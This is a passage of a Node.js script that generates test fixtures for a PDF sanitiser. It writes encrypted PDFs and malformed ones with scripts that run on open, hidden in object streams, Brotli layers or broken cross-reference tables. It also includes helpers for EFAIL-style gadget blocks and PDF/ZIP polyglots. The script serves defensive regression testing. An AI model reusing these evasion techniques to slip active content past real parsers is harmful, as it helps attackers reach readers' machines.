// Regenerates the test fixtures. Needs qpdf and a test build (npm run build:test).
// The outputs are committed so every run reads the same bytes, and a rerun writes the same bytes again. qpdf runs with
// a fixed ID and fixed AES IVs, and revision 6 files copy an encryption dictionary computed here from fixed salts.
// The tests still run qpdf, as a second parser and to encrypt one input too large to commit.
//
// test/fixtures/cases/ holds one small file per problem a review found, written here from scratch.
// manifest.json in that folder says what each file reproduces and what the tests expect of it.
const { execFileSync } = require('node:child_process');
const crypto = require('node:crypto');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const zlib = require('node:zlib');
const { FONT, HELLO, LINK, PdfBuilder, appendUpdate, makeDoc, serializeObject } = require('../build-test/test/helpers/builder.js');

const B = s => Buffer.from(s, 'latin1');
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'pdf-defuse-fixtures-'));
// The folder goes however the script ends, a failed qpdf run included.
process.on('exit', () => fs.rmSync(tmp, { recursive: true, force: true }));
const QPDF_FIXED = ['--static-id', '--static-aes-iv'];

/** Runs qpdf on `input` with `args` and returns the output. */
function qpdf(input, args) {
  const inPath = path.join(tmp, 'in.pdf');
  const outPath = path.join(tmp, 'out.pdf');
  fs.writeFileSync(inPath, input);
  execFileSync('qpdf', [...QPDF_FIXED, ...args, inPath, outPath], { stdio: 'inherit' });
  return fs.readFileSync(outPath);
}

// Revision 6 of the standard security handler, ISO 32000-2 Algorithms 2.B, 8, 9 and 10, with fixed salts and file key.
const sha = (alg, ...parts) => crypto.createHash(alg).update(Buffer.concat(parts)).digest();
function hash2B(password, salt, udata) {
  let k = sha('sha256', password, salt, udata);
  let e = Buffer.alloc(0);
  for (let round = 0; round < 64 || e[e.length - 1] > round - 32; round++) {
    const k1 = Buffer.concat(new Array(64).fill(Buffer.concat([password, k, udata])));
    const c = crypto.createCipheriv('aes-128-cbc', k.subarray(0, 16), k.subarray(16, 32));
    c.setAutoPadding(false);
    e = Buffer.concat([c.update(k1), c.final()]);
    let sum = 0;
    for (let i = 0; i < 16; i++) sum += e[i];
    k = sha(['sha256', 'sha384', 'sha512'][sum % 3], e);
  }
  return k.subarray(0, 32);
}
function aes256Raw(key, data, mode) {
  const c = crypto.createCipheriv(mode, key, mode === 'aes-256-ecb' ? null : Buffer.alloc(16));
  c.setAutoPadding(false);
  return Buffer.concat([c.update(data), c.final()]);
}
const FILE_KEY = Buffer.alloc(32, 0x5a);
const SALTS = { uv: B('uvsaltuv'), uk: B('uksaltuk'), ov: B('ovsaltov'), ok: B('oksaltok') };
const hex = b => `<${b.toString('hex')}>`;
/**
 * The keys of a revision 6 encryption dictionary for the user and owner passwords, given as the bytes the file is
 * encrypted with. `filters` replaces the default crypt filter entries.
 */
function r6Keys(user, owner, filters = '/CF << /StdCF << /AuthEvent /DocOpen /CFM /AESV3 /Length 32 >> >> /StmF /StdCF /StrF /StdCF') {
  const u = user.subarray(0, 127);
  const o = owner.subarray(0, 127);
  const U = Buffer.concat([hash2B(u, SALTS.uv, Buffer.alloc(0)), SALTS.uv, SALTS.uk]);
  const UE = aes256Raw(hash2B(u, SALTS.uk, Buffer.alloc(0)), FILE_KEY, 'aes-256-cbc');
  const O = Buffer.concat([hash2B(o, SALTS.ov, U), SALTS.ov, SALTS.ok]);
  const OE = aes256Raw(hash2B(o, SALTS.ok, U), FILE_KEY, 'aes-256-cbc');
  const perms = Buffer.concat([Buffer.from([0xfc, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff]), B('Tadbfxtr')]);
  return `<< /Filter /Standard /V 5 /R 6 /Length 256 ${filters} /O ${hex(O)} /U ${hex(U)} /OE ${hex(OE)} /UE ${hex(UE)} /P -4 /Perms ${hex(aes256Raw(FILE_KEY, perms, 'aes-256-ecb'))} >>`;
}
const FILE_ID = `/ID [<${'42'.repeat(16)}> <${'42'.repeat(16)}>]`;
/** AESV3 encryption of one string or stream with the file key, behind a fixed IV. */
function aesv3(data) {
  const iv = Buffer.alloc(16, 0x24);
  const c = crypto.createCipheriv('aes-256-cbc', FILE_KEY, iv);
  return Buffer.concat([iv, c.update(data), c.final()]);
}
/** `input` encrypted by qpdf at revision 6, with the encryption dictionary of a small file made here. */
function encryptR6(input, user, owner, extra = []) {
  const seed = new PdfBuilder();
  seed.root = seed.add('<< /Type /Catalog /Pages 2 0 R >>');
  seed.add('<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 612 792] >>');
  seed.add('<< /Type /Page /Parent 2 0 R >>');
  const enc = seed.add(r6Keys(user, owner));
  const seedPath = path.join(tmp, 'seed.pdf');
  fs.writeFileSync(seedPath, seed.build({ trailerExtra: `/Encrypt ${enc} 0 R ${FILE_ID}` }));
  return qpdf(input, [`--copy-encryption=${seedPath}`, `--encryption-file-password=${owner.toString('utf8')}`, ...extra]);
}
const utf8 = s => Buffer.from(s, 'utf8');

// ---------------------------------------------------------------------------------------------------------------
// The encrypted fixtures in test/fixtures.

const dir = path.join(__dirname, '..', 'test', 'fixtures');
fs.mkdirSync(dir, { recursive: true });
const xmp = '<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?><x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"/></x:xmpmeta><?xpacket end="w"?>';
const base = makeDoc({
  catalog: '/OpenAction 6 0 R /Metadata 7 0 R /Names << /EmbeddedFiles << /Names [(note.txt) 8 0 R] >> >>',
  objects: [
    '<< /S /JavaScript /JS (app.alert\\("encrypted script"\\);) >>',
    { dict: '<< /Type /Metadata /Subtype /XML >>', stream: xmp },
    '<< /Type /Filespec /F (note.txt) /UF (note.txt) /EF << /F 9 0 R >> >>',
    { dict: '<< /Type /EmbeddedFile /Subtype /text#2Fplain >>', stream: 'attached text', deflate: true },
  ],
  info: '<< /Title (Encrypted fixture) /Author (pdf-defuse tests) >>',
}).pdf;
fs.writeFileSync(path.join(dir, 'base.pdf'), base);

const OBJSTM = ['--object-streams=generate'];
const variants = [
  ['r2-rc4-40.pdf', ['--allow-weak-crypto', '--encrypt', '', 'owner', '40', '--']],
  ['r3-rc4-128.pdf', ['--allow-weak-crypto', '--encrypt', '', 'owner', '128', '--use-aes=n', '--']],
  ['r3-rc4-128-objstm.pdf', ['--allow-weak-crypto', '--encrypt', '', 'owner', '128', '--use-aes=n', '--', ...OBJSTM]],
  ['r4-aes128.pdf', ['--encrypt', '', 'owner', '128', '--use-aes=y', '--']],
  ['r4-aes128-objstm.pdf', ['--encrypt', '', 'owner', '128', '--use-aes=y', '--', ...OBJSTM]],
  ['r4-aes128-cleartext-metadata.pdf', ['--encrypt', '', 'owner', '128', '--use-aes=y', '--cleartext-metadata', '--']],
  ['r6-aes256.pdf', ['', 'owner']],
  ['r6-aes256-objstm.pdf', ['', 'owner', ...OBJSTM]],
  ['r2-rc4-40-userpw.pdf', ['--allow-weak-crypto', '--encrypt', 'user', 'owner', '40', '--']],
  ['r3-rc4-128-userpw.pdf', ['--allow-weak-crypto', '--encrypt', 'user', 'owner', '128', '--use-aes=n', '--']],
  ['r4-aes128-userpw.pdf', ['--encrypt', 'user', 'owner', '128', '--use-aes=y', '--']],
  ['r6-aes256-userpw.pdf', ['user', 'owner']],
  // The page tree lands in an encrypted object stream, so it is unreadable without the password.
  ['r4-aes128-objstm-userpw.pdf', ['--encrypt', 'user', 'owner', '128', '--use-aes=y', '--', ...OBJSTM]],
  ['r6-aes256-objstm-userpw.pdf', ['user', 'owner', ...OBJSTM]],
];
for (const [name, args] of variants) {
  // Revision 6 entries name the user and owner passwords, then any further qpdf options.
  const out = name.startsWith('r6-') ? encryptR6(base, utf8(args[0]), utf8(args[1]), args.slice(2)) : qpdf(base, args);
  fs.writeFileSync(path.join(dir, name), out);
  console.log('wrote', name, out.length, 'bytes');
}

// Scripts on a page, a form field and a link's /Next chain, all packed into AES-256 object streams.
const actions = encryptR6(
  makeDoc({
    catalog: '/AcroForm << /Fields [8 0 R] >>',
    page: '/AA << /O 6 0 R >>',
    objects: ['<< /S /GoTo /D [3 0 R /Fit] /Next 7 0 R >>', '<< /S /JavaScript /JS (encPage\\(\\)) >>', '<< /FT /Tx /T (f) /AA << /K << /S /JavaScript /JS (encField\\(\\)) >> >> >>'],
    annots: [LINK('<< /S /GoTo /D [3 0 R /Fit] /Next << /S /JavaScript /JS (encLink\\(\\)) >> >>')],
  }).pdf,
  utf8(''),
  utf8('owner'),
  OBJSTM,
);
fs.writeFileSync(path.join(dir, 'r6-aes256-objstm-actions.pdf'), actions);
console.log('wrote r6-aes256-objstm-actions.pdf', actions.length, 'bytes');

// ---------------------------------------------------------------------------------------------------------------
// test/fixtures/cases: one file per problem a review found.

const HEADER = '%PDF-1.7\n';
/** PdfBuilder with a plain ASCII header, without the usual binary comment line. */
class Builder extends PdfBuilder {
  build(o = {}) {
    return super.build({ header: HEADER, ...o });
  }
}
const SCRIPT = (js = 'app.alert\\("pdf-defuse fixture"\\);') => `<< /S /JavaScript /JS (${js}) >>`;
const PAGE_FONT = `/Resources << /Font << /F1 ${FONT} >> >>`;
const text = line => `BT /F1 24 Tf 72 720 Td (${line}) Tj ET`;

/** The objects of a one-page "Hello" file after its catalog: page tree, page, font and content. */
function hello(b, page = '') {
  b.set(2, '<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 612 792] >>');
  b.set(3, `<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R ${page}>>`);
  b.set(4, FONT);
  b.set(5, { dict: '<< >>', stream: HELLO });
}
function helloDoc(catalog = '', page = '', extra = []) {
  const b = new Builder();
  b.root = 1;
  b.set(1, `<< /Type /Catalog /Pages 2 0 R ${catalog}>>`);
  hello(b, page);
  for (const [i, body] of extra.entries()) b.set(6 + i, body);
  return b;
}

/** `pdf` with one more xref section that changes nothing, whose trailer also holds `keys`. */
const emptyUpdate = (pdf, size, keys) => Buffer.concat([pdf, B(`xref\n0 1\n0000000000 65535 f\r\ntrailer\n<< /Size ${size} /Root 1 0 R ${keys} >>\nstartxref\n${pdf.length}\n%%EOF\n`)]);

/** The offset in the trailer's startxref. */
const startxref = pdf => Number(/startxref\s+(\d+)\s+%%EOF\s*$/.exec(pdf.toString('latin1'))[1]);

/** `pdf` with an update that frees object `num`, giving it generation 1. */
const freeInUpdate = (pdf, num) => Buffer.concat([pdf, B(`xref\n${num} 1\n0000000000 00001 f\r\ntrailer\n<< /Size 6 /Root 1 0 R /Prev ${startxref(pdf)} >>\nstartxref\n${pdf.length}\n%%EOF\n`)]);

/** Where row `num` of the one cross-reference table of `pdf` starts. */
function rowAt(pdf, num) {
  const m = /xref\n0 \d+\n/.exec(pdf.toString('latin1'));
  return m.index + m[0].length + 20 * num;
}
const rowOf = (pdf, num) => pdf.subarray(rowAt(pdf, num), rowAt(pdf, num) + 20).toString('latin1');
const setRow = (pdf, num, row) => Buffer.concat([pdf.subarray(0, rowAt(pdf, num)), B(row), pdf.subarray(rowAt(pdf, num) + 20)]);
/** `pdf` with `def`, a definition no cross-reference row names, written just before its one table. */
function hiddenDef(pdf, def) {
  const at = pdf.lastIndexOf(B('\nxref\n')) + 1;
  const tail = pdf
    .subarray(at)
    .toString('latin1')
    .replace(/startxref\n(\d+)/, (_, n) => `startxref\n${Number(n) + def.length}`);
  return Buffer.concat([pdf.subarray(0, at), B(def), B(tail)]);
}

/**
 * A file whose `packed` objects sit in an object stream, found through an xref stream. `objstm` gives the object
 * stream's filter entries and encoder, `xref` the xref stream's, and `header` replaces the object stream's offsets.
 */
function streamDoc({ version = '1.7', plain, packed, objstm, xref, header }) {
  const parts = [];
  let at = 0;
  const push = buf => {
    parts.push(buf);
    at += buf.length;
  };
  push(B(`%PDF-${version}\n`));
  const rows = new Map();
  for (const [n, body] of plain) {
    rows.set(n, [1, at, 0]);
    const s = serializeObject(n, body);
    push(typeof s === 'string' ? B(s) : s);
  }
  const stm = Math.max(...plain.map(p => p[0]), ...packed.map(p => p[0])) + 1;
  const xrefNum = stm + 1;
  let offsets = '';
  let body = '';
  packed.forEach(([n, obj], i) => {
    offsets += `${n} ${body.length} `;
    body += `${obj}\n`;
    rows.set(n, [2, stm, i]);
  });
  offsets = header ?? offsets;
  const data = objstm.encode(B(`${offsets}\n${body}`));
  rows.set(stm, [1, at, 0]);
  push(Buffer.concat([B(`${stm} 0 obj\n<< /Type /ObjStm /N ${packed.length} /First ${offsets.length + 1} ${objstm.entries} /Length ${data.length} >>\nstream\n`), data, B('\nendstream\nendobj\n')]));
  rows.set(xrefNum, [1, at, 0]);
  const table = Buffer.alloc(7 * (xrefNum + 1));
  for (let n = 0; n <= xrefNum; n++) {
    const [t, f2, f3] = rows.get(n) ?? [0, 0, n === 0 ? 65535 : 0];
    table[7 * n] = t;
    table.writeUInt32BE(f2, 7 * n + 1);
    table.writeUInt16BE(f3, 7 * n + 5);
  }
  const xdata = xref.encode(table);
  const xrefAt = at;
  push(Buffer.concat([B(`${xrefNum} 0 obj\n<< /Type /XRef /Size ${xrefNum + 1} /W [1 4 2] /Root 1 0 R ${xref.entries} /Length ${xdata.length} >>\nstream\n`), xdata]));
  push(B(`\nendstream\nendobj\nstartxref\n${xrefAt}\n%%EOF\n`));
  return Buffer.concat(parts);
}
const FLATE = { entries: '/Filter /FlateDecode', encode: b => zlib.deflateSync(b) };
const brotli = b => zlib.brotliCompressSync(b);
const BROTLI = { entries: '/Filter /BrotliDecode', encode: brotli };
/** Page tree, page and font as plain objects, with the page content under `content`. */
const plainPage = content => [
  [2, '<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 612 792] >>'],
  [3, '<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>'],
  [4, FONT],
  [5, content],
];
/** The PNG Up predictor over rows of `columns` bytes, padding the data with spaces to whole rows. */
function pngUp(data, columns) {
  const rows = Math.ceil(data.length / columns);
  const padded = Buffer.concat([data, Buffer.alloc(rows * columns - data.length, 0x20)]);
  const out = Buffer.alloc(rows * (columns + 1));
  for (let r = 0; r < rows; r++) {
    out[r * (columns + 1)] = 2;
    for (let c = 0; c < columns; c++) {
      const above = r ? padded[(r - 1) * columns + c] : 0;
      out[r * (columns + 1) + 1 + c] = (padded[r * columns + c] - above) & 0xff;
    }
  }
  return out;
}

/** The objects of a file with no cross-reference table, joined as written, with offsets left to a scan. */
const loose = (...lines) => B(lines.join('\n'));

/** A file with one attached file. `subtype` is the declared MIME type, with the slash escaped. */
const attachment = (name, subtype, body) =>
  helloDoc(`/Names << /EmbeddedFiles << /Names [(${name}) 6 0 R] >> >>`, '', [
    `<< /Type /Filespec /F (${name}) /UF (${name}) /EF << /F 7 0 R >> >>`,
    { dict: `<< /Type /EmbeddedFile /Subtype /${subtype} >>`, stream: body },
  ]).build();

/** A file that encrypts only its attached files, at revision 6: strings and streams under Identity, files under /EFF. */
function attachmentsOnly(withScript) {
  const filters = '/CF << /StdCF << /AuthEvent /EFOpen /CFM /AESV3 /Length 32 >> >> /StmF /Identity /StrF /Identity /EFF /StdCF';
  const files = withScript
    ? [
        ['notes.txt', 'text#2Fplain', 'attached text'],
        ['table.csv', 'text#2Fcsv', 'a,b\n1,2\n'],
      ]
    : [['notes.txt', 'text#2Fplain', 'attached text']];
  const b = new Builder();
  b.root = 1;
  const names = files.map(([name], i) => `(${name}) ${7 + 2 * i} 0 R`).join(' ');
  b.set(1, `<< /Type /Catalog /Pages 2 0 R /Names << ${withScript ? '/JavaScript << /Names [(doc) 6 0 R] >> ' : ''}/EmbeddedFiles << /Names [${names}] >> >> >>`);
  hello(b);
  if (withScript) b.set(6, SCRIPT());
  files.forEach(([name, subtype, body], i) => {
    b.set(7 + 2 * i, `<< /Type /Filespec /F (${name}) /UF (${name}) /EF << /F ${8 + 2 * i} 0 R >> >>`);
    b.set(8 + 2 * i, { dict: `<< /Type /EmbeddedFile /Subtype /${subtype} >>`, stream: aesv3(B(body)) });
  });
  const enc = 7 + 2 * files.length;
  b.set(enc, r6Keys(utf8('attachment'), utf8('fixture-owner'), filters));
  return b.build({ trailerExtra: `/Encrypt ${enc} 0 R ${FILE_ID}` });
}

/**
 * A file whose `members` objects sit in `count` object streams, each padded with `pad` spaces, and an array in the
 * catalog that names them in turn across the streams, so each lookup goes to another stream.
 */
function manyStreams(count, members, pad) {
  const plain = [
    [2, '<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 612 792] >>'],
    [3, '<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>'],
    [4, FONT],
    [5, { dict: '<< >>', stream: HELLO }],
  ];
  const first = 100;
  const refs = [];
  for (let m = 0; m < members; m++) for (let k = 0; k < count; k++) refs.push(`${first + k * members + m} 0 R`);
  plain.unshift([1, `<< /Type /Catalog /Pages 2 0 R /Names ${refs.length} /Spread [${refs.join(' ')}] >>`]);
  const parts = [];
  let at = 0;
  const push = buf => {
    parts.push(buf);
    at += buf.length;
  };
  push(B(HEADER));
  const rows = new Map();
  for (const [n, body] of plain) {
    rows.set(n, [1, at, 0]);
    const o = serializeObject(n, body);
    push(typeof o === 'string' ? B(o) : o);
  }
  for (let k = 0; k < count; k++) {
    let header = '';
    let body = '';
    for (let m = 0; m < members; m++) {
      const n = first + k * members + m;
      header += `${n} ${body.length} `;
      body += `<< /Member ${m} >>\n`;
      rows.set(n, [2, 10 + k, m]);
    }
    const data = zlib.deflateSync(Buffer.concat([B(`${header}\n${body}`), Buffer.alloc(pad, 0x20)]), { level: 9 });
    rows.set(10 + k, [1, at, 0]);
    push(Buffer.concat([B(`${10 + k} 0 obj\n<< /Type /ObjStm /N ${members} /First ${header.length + 1} /Filter /FlateDecode /Length ${data.length} >>\nstream\n`), data, B('\nendstream\nendobj\n')]));
  }
  const size = first + count * members + 1;
  rows.set(size - 1, [1, at, 0]);
  const table = Buffer.alloc(7 * size);
  for (let n = 0; n < size; n++) {
    const [t, f2, f3] = rows.get(n) ?? [0, 0, n === 0 ? 65535 : 0];
    table[7 * n] = t;
    table.writeUInt32BE(f2, 7 * n + 1);
    table.writeUInt16BE(f3, 7 * n + 5);
  }
  const xdata = zlib.deflateSync(table);
  const xrefAt = at;
  push(Buffer.concat([B(`${size - 1} 0 obj\n<< /Type /XRef /Size ${size} /W [1 4 2] /Root 1 0 R /Filter /FlateDecode /Length ${xdata.length} >>\nstream\n`), xdata]));
  push(B(`\nendstream\nendobj\nstartxref\n${xrefAt}\n%%EOF\n`));
  return Buffer.concat(parts);
}

/** A file whose last object in an object stream, the script `member` runs on open, is followed by `pad` spaces. */
const paddedMember = (member, pad) =>
  streamDoc({
    plain: plainPage({ dict: '<< >>', stream: HELLO }),
    packed: [
      [1, '<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R >>'],
      [6, member],
    ],
    objstm: { entries: '/Filter /FlateDecode', encode: b => zlib.deflateSync(Buffer.concat([b, Buffer.alloc(pad, 0x20)]), { level: 9 }) },
    xref: FLATE,
  });

/** A file that encrypts only its attached files at revision 6, whose page content `content` names their key. */
function attachmentsOnlyContent(content) {
  const b = new Builder();
  b.root = 1;
  b.set(1, '<< /Type /Catalog /Pages 2 0 R >>');
  hello(b);
  b.set(5, { dict: content, stream: aesv3(B(HELLO)) });
  b.set(6, r6Keys(utf8('attachment'), utf8('fixture-owner'), '/CF << /StdCF << /AuthEvent /EFOpen /CFM /AESV3 /Length 32 >> >> /StmF /Identity /StrF /Identity /EFF /StdCF'));
  return b.build({ trailerExtra: `/Encrypt 6 0 R ${FILE_ID}` });
}

/** The early offsets Microsoft Print to PDF writes: every xref offset one byte before its object, on a newline. */
function earlyOffsets(objs) {
  let s = '%PDF-1.7\n';
  const offs = [];
  objs.forEach((o, i) => {
    s += '\n';
    offs.push(s.length - 1);
    s += `${i + 1} 0 obj\n${o}\nendobj`;
  });
  s += '\n';
  const xrefAt = s.length - 1;
  s += `xref\n0 ${objs.length + 1}\n0000000000 65535 f\r\n${offs.map(o => `${String(o).padStart(10, '0')} 00000 n\r\n`).join('')}`;
  s += `trailer\n<< /Size ${objs.length + 1} /Root 1 0 R >>\nstartxref\n${xrefAt}\n%%EOF\n`;
  return B(s);
}

/**
 * Lines laid out in 16-byte blocks, each line of PDF followed by a block of bytes a reader cannot know, as EFAIL needs.
 * `tail` follows the blocks as written, like objects an attacker adds outside the encrypted part.
 */
function efailBlocks(lines, tail = '') {
  // Printable filler without line breaks stands for the unknown ciphertext blocks, so each one stays in its comment.
  let seed = 7;
  const filler = () => {
    let s = '';
    for (let i = 0; i < 16; i++) {
      seed = (seed * 1103515245 + 12345) % 2147483648;
      s += String.fromCharCode(0x21 + (seed % 94));
    }
    return s.replace(/%/g, '*');
  };
  let out = filler();
  for (const line of lines) {
    const known = `\n${line} %`;
    if (known.length > 16) throw new Error(`EFAIL line longer than a block: ${line}`);
    out += known.padEnd(16, ' ') + filler();
  }
  return B(`${out}\n${tail}`);
}

/** ASCII85 of a string, ending in the ~> marker. */
function ascii85(s) {
  const data = B(s);
  let out = '';
  for (let i = 0; i < data.length; i += 4) {
    const chunk = Buffer.alloc(4);
    data.copy(chunk, 0, i, i + 4);
    let n = chunk.readUInt32BE(0);
    const digits = [];
    for (let j = 0; j < 5; j++) {
      digits.unshift(String.fromCharCode(33 + (n % 85)));
      n = Math.floor(n / 85);
    }
    const take = Math.min(4, data.length - i) + 1;
    out += take === 5 && digits.join('') === '!!!!!' ? 'z' : digits.slice(0, take).join('');
  }
  return `${out}~>`;
}

/** The CRC-32 a ZIP archive stores. */
function crc32(data) {
  let crc = 0xffffffff;
  for (const byte of data) {
    crc ^= byte;
    for (let k = 0; k < 8; k++) crc = crc & 1 ? (crc >>> 1) ^ 0xedb88320 : crc >>> 1;
  }
  return (crc ^ 0xffffffff) >>> 0;
}

/** A stored ZIP archive of one file, as appended to a PDF/ZIP polyglot. */
function zipOf(name, body) {
  const data = B(body);
  const crc = crc32(data);
  const local = Buffer.alloc(30);
  local.writeUInt32LE(0x04034b50, 0);
  local.writeUInt16LE(10, 4);
  local.writeUInt32LE(crc, 14);
  local.writeUInt32LE(data.length, 18);
  local.writeUInt32LE(data.length, 22);
  local.writeUInt16LE(name.length, 26);
  const central = Buffer.alloc(46);
  central.writeUInt32LE(0x02014b50, 0);
  central.writeUInt16LE(20, 4);
  central.writeUInt16LE(10, 6);
  central.writeUInt32LE(crc, 16);
  central.writeUInt32LE(data.length, 20);
  central.writeUInt32LE(data.length, 24);
  central.writeUInt16LE(name.length, 28);
  const localPart = Buffer.concat([local, B(name), data]);
  const centralPart = Buffer.concat([central, B(name)]);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(1, 8);
  end.writeUInt16LE(1, 10);
  end.writeUInt32LE(centralPart.length, 12);
  end.writeUInt32LE(localPart.length, 16);
  return Buffer.concat([localPart, centralPart, end]);
}

const cases = {
  // Fixed in 0.2.0: offsets before the start of the file. A catalog that does not parse, then an update whose /Prev or
  // /XRefStm is negative.
  'prev-negative-unreadable.pdf': () => {
    const b = new Builder();
    b.root = b.add('<\n  /Type /Catalog\n>>');
    return emptyUpdate(b.build(), 2, '/Prev -200');
  },
  'xrefstm-negative-unreadable.pdf': () => {
    const b = new Builder();
    b.root = b.add('<\n  /Type /Catalog\n>>');
    return emptyUpdate(b.build(), 2, '/XRefStm -1');
  },
  'prev-negative.pdf': () => emptyUpdate(helloDoc().build(), 6, '/Prev -200'),
  'xrefstm-negative.pdf': () => helloDoc().build({ trailerExtra: '/XRefStm -1' }),
  // Object 6 sits 40 bytes before the object stream's /First. Its pair comes first in the header, so the catalog's
  // offset after it is larger and pdf.js reads the catalog.
  'objstm-offset-negative.pdf': () =>
    streamDoc({
      plain: plainPage({ dict: '<< >>', stream: HELLO, deflate: true }),
      packed: [
        [1, '<< /Type /Catalog /Pages 2 0 R /Outlines 6 0 R >>'],
        [6, '<< /Type /Outlines /Count 0 >>'],
      ],
      header: '6 -40 1 0 ',
      objstm: FLATE,
      xref: FLATE,
    }),
  'length-fractional.pdf': () => {
    const b = helloDoc();
    b.set(5, `<< /Length ${HELLO.length}.5 >>\nstream\n${HELLO}\nendstream`);
    return b.build();
  },
  // An update frees the page content and gives it generation 1.
  'update-frees-content.pdf': () => freeInUpdate(helloDoc().build(), 5),
  'page-contents-annots-null.pdf': () => {
    const b = new Builder();
    b.root = b.add('<< /Type /Catalog /Pages 2 0 R >>');
    b.add('<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 612 792] >>');
    b.add('<< /Type /Page /Parent 2 0 R /Contents null /Annots null >>');
    return b.build();
  },
  'page-annots-missing-object.pdf': () => helloDoc('', '/Annots 99 0 R').build(),

  // Fixed in 0.2.0: revision 6 passwords through SASLprep.
  // Encrypted with U+5F33, the Unicode 3.2 form of U+2F874.
  'r6-password-unicode32.pdf': () => encryptR6(helloDoc().build(), utf8('Password\u5F33!'), utf8('fixture-owner')),
  // Encrypted with U+5F53, the form of U+2F874 after Corrigendum #4, which a password prepared as Unicode 3.2 must not open.
  'r6-password-corrigendum4.pdf': () => encryptR6(helloDoc().build(), utf8('Password\u5F53!'), utf8('fixture-owner')),
  // Encrypted with U+AC00 U+0323 U+0300, the normal form of the password typed as U+AC00 U+0300 U+0323.
  'r6-password-unnormalized.pdf': () => encryptR6(helloDoc().build(), utf8('\uAC00\u0323\u0300'), utf8('fixture-owner')),
  // Encrypted with "SaSLprep", typed with an ordinal indicator for the "a" and a soft hyphen in it.
  'r6-password-saslprep.pdf': () => encryptR6(helloDoc().build(), utf8('SaSLprep'), utf8('fixture-owner')),
  // Fixed in the fourth review of 0.2.0: encrypted with the bytes of a password SASLprep refuses, for its private-use
  // character, as qpdf writes it. pdf.js tries the password as typed too.
  'r6-password-raw.pdf': () => encryptR6(helloDoc().build(), utf8('pw\uE000'), utf8('fixture-owner')),

  // Fixed in 0.2.0: BrotliDecode, in PDF 2.0 files whose xref stream, object stream and content all use it.
  'brotli-objstm.pdf': () =>
    streamDoc({
      version: '2.0',
      plain: plainPage({ dict: '<< /Filter /BrotliDecode >>', stream: brotli(B(HELLO)) }),
      packed: [[1, '<< /Type /Catalog /Pages 2 0 R >>']],
      objstm: BROTLI,
      xref: BROTLI,
    }),
  'brotli-objstm-script.pdf': () =>
    streamDoc({
      version: '2.0',
      plain: plainPage({ dict: '<< /Filter /BrotliDecode >>', stream: brotli(B(HELLO)) }),
      packed: [
        [1, '<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R >>'],
        [6, SCRIPT()],
      ],
      objstm: BROTLI,
      xref: BROTLI,
    }),
  // The object stream is Brotli data behind the PNG Up predictor, which readers apply differently after Brotli.
  'brotli-predictor.pdf': () =>
    streamDoc({
      version: '2.0',
      plain: plainPage({ dict: '<< >>', stream: HELLO, deflate: true }),
      packed: [
        [1, '<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R >>'],
        [6, SCRIPT()],
      ],
      objstm: { entries: '/Filter /BrotliDecode /DecodeParms << /Predictor 12 /Columns 16 >>', encode: b => brotli(pngUp(b, 16)) },
      xref: FLATE,
    }),
  'brotli-twice.pdf': () =>
    streamDoc({
      version: '2.0',
      plain: plainPage({ dict: '<< >>', stream: HELLO, deflate: true }),
      packed: [
        [1, '<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R >>'],
        [6, SCRIPT()],
      ],
      objstm: { entries: '/Filter [/BrotliDecode /BrotliDecode]', encode: b => brotli(brotli(b)) },
      xref: FLATE,
    }),

  // Fixed in 0.2.0: the trailer's /Root is a dictionary, with no cross-reference table, the page written inside /Kids,
  // and a content stream without /Length.
  'root-direct.pdf': () =>
    loose(
      '%PDF-1.4',
      '',
      `1 0 obj\n<< /Kids [<< /Parent 1 0 R ${PAGE_FONT} /Contents 2 0 R >>] /Count 1 /MediaBox [0 0 612 792] >>\nendobj`,
      '',
      `2 0 obj\n<< >>\nstream\n${HELLO}\nendstream\nendobj`,
      '',
      'trailer\n<< /Root << /Pages 1 0 R >> >>',
      '',
    ),
  // An empty cross-reference table and a trailer that holds the whole document.
  'root-direct-xref.pdf': () => {
    const root = `<< /Pages << /Type /Pages /Kids [<< /Type /Page /MediaBox [0 0 612 792] >>] /Count 1 >> /OpenAction ${SCRIPT()} >>`;
    return B(`${HEADER}xref\n0 0\ntrailer\n<< /Root ${root} >>\nstartxref\n9\n%%EOF\n`);
  },
  // No %PDF- header.
  'header-missing.pdf': () =>
    loose(
      '% This file has no PDF header.',
      '',
      '1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj',
      '2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] /MediaBox [0 0 612 792] >>\nendobj',
      `3 0 obj\n<< /Type /Page /Parent 2 0 R ${PAGE_FONT} /Contents 4 0 R >>\nendobj`,
      `4 0 obj\n<< >>\nstream\n${HELLO}\nendstream\nendobj`,
      'trailer\n<< /Root 1 0 R >>',
      '',
    ),
  // No header, and a page that never closes.
  'header-missing-unreadable.pdf': () =>
    loose(
      'UPDF-1.4',
      '1 0 obj\n<< /Type /Pages /Kids [2 0 R] /Count 1 >>\nendobj',
      '2 0 obj\n<< /Type /Page /Parent 1 0 R /MediaBox [0 0 400 400',
      'endobj',
      'trailer\n<< /Root << /Type /Catalog /Pages 1 0 R >> >>',
      '',
    ),
  'not-a-pdf.pdf': () => B('This is a text file with a .pdf name.\n'),
  // The end of the file cuts the trailer off. The catalog has no /Type, so only the trailer names it.
  'trailer-cut.pdf': () => {
    const b = helloDoc();
    b.set(1, '<< /Pages 2 0 R /OpenAction 6 0 R >>');
    b.set(6, SCRIPT());
    const whole = b.build({ xref: 'none' });
